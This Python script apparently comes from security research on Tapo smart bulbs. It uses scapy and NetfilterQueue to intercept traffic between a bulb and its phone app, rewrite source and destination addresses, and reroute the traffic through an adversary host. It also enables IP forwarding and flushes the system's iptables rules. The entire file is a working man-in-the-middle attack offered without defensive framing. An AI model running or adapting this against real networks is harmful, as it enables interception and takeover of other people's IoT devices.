#!/usr/bin/env python3

import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from commons.properties import *
from commons.functions import *

from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

if(len(sys.argv) < 2):
    print("Usage: python3 script.py [device_type]")
    exit(1)

TapoDevice = instantiate_class_from_text(sys.argv[1])

BULB_IP = TapoDevice.ip_not_conf
APP_IP = TapoApp.ip

ADVERSARY_IP = Evil.ip
EVIL = Evil.ip2

def process_packet(pkt):
    scapy_pkt = IP(pkt.get_payload())
    app_to_broadcast = scapy_pkt[IP].src == APP_IP and scapy_pkt[IP].dst == "255.255.255.255"
    bulb_to_evil = scapy_pkt[IP].src == BULB_IP and scapy_pkt[IP].dst == EVIL
    app_to_bulb = scapy_pkt[IP].src == APP_IP and scapy_pkt[IP].dst == BULB_IP
    evil_to_app = (scapy_pkt[IP].src == ADVERSARY_IP and scapy_pkt[IP].dst == APP_IP)

    if app_to_broadcast:
        scapy_pkt[IP].src = EVIL
        scapy_pkt[IP].dst = BULB_IP
        scapy_pkt = re_checksum_packet(scapy_pkt)
        send(scapy_pkt)
    elif bulb_to_evil and scapy_pkt.haslayer(UDP):
        scapy_pkt[IP].src = ADVERSARY_IP
        scapy_pkt[IP].dst = APP_IP
        scapy_pkt = re_checksum_packet(scapy_pkt)
        send(scapy_pkt)

    if scapy_pkt.haslayer(TCP) and (app_to_bulb or evil_to_app):
        if app_to_bulb:
            scapy_pkt[IP].dst = ADVERSARY_IP
        elif evil_to_app:
            scapy_pkt[IP].src = BULB_IP
        scapy_pkt = re_checksum_packet(scapy_pkt)
        pkt.set_payload(bytes(scapy_pkt))
  
    pkt.accept()

if __name__ == "__main__":

    os.system("sysctl -w net.ipv4.ip_forward=1")
    os.system("iptables --flush"
              + ";" + "iptables -A " + RULE_FORWARD
              + ";" + "iptables -A " + RULE_INPUT
              + ";" + "iptables -A " + RULE_OUTPUT)

    nf_queue = NetfilterQueue()
    nf_queue.bind(1, process_packet)

    try:
        nf_queue.run()
    except KeyboardInterrupt:
        print("Getting out")
        
    nf_queue.unbind()
    os.system("iptables --flush")
    os.system("sysctl -w net.ipv4.ip_forward=0")
